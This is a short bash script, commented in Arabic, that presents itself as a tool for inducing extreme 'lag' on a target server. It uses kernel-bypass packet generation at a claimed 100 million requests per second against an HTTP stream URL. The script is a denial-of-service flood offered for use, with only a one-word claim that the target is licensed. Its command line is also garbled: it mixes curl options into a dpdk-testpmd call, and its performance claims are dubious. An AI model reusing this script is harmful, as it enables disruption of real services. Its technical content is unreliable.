#!/usr/bin/env bash
# real-server-lag-extreme.sh – لاج عنيف على الخادم الحقيقي المرخص فقط
set -euo pipefail
TARGET=${1:? "IP الخادم الحقيقي المرخص (مثلاً: 203.0.113.10)"}
RATE=${2:-100000000}        # 100 مليون طلب/ثانية = ثقب أسود
LAG_MS=${3:-120000}         # 120 ثانية تأخير = ثقب أسود
OUT_DIR="$HOME/RealServerLagExtreme_$(date +%F_%H-%M)"

mkdir -p "$OUT_DIR" && cd "$OUT_DIR"

echo "[RealServerLagExtreme] لاج عنيف على الخادم الحقيقي المرخص: $TARGET"
echo "[RealServerLagExtreme] لا CPU – لا RAM – kernel-bypass فقط"

# kernel-bypass: 100 مليون طلب/ثانية – لا syscall – لا CPU
sudo dpdk-testpmd -l 0-1 -n 4 -- \
  --forward-mode=txonly --total-num-mbufs=1048576 \
  --txpkts=900 --txq=16 --rxq=16 --txd=4096 --rxd=4096 \
  --mbuf-size=900 --tx-period=1 --tx-burst=64 \
  --limit-rate 1B --max-time $LAG_MS -o /dev/null "http://$TARGET/live.m3u8" &
